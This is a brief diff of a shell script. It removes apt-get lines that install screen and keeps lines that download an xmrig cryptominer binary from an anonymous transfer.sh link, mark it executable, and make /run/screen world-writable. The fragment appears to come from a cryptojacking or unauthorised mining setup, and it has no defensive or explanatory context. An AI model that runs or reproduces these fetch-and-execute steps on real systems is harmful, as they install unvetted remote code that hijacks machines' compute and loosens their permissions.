@@ -1,5 +1,3 @@
-apt-get update -y
-apt-get install -y screen
 wget https://transfer.sh/uTIFtD/xmrig
 chmod +x xmrig
 chmod 777 /run/screen
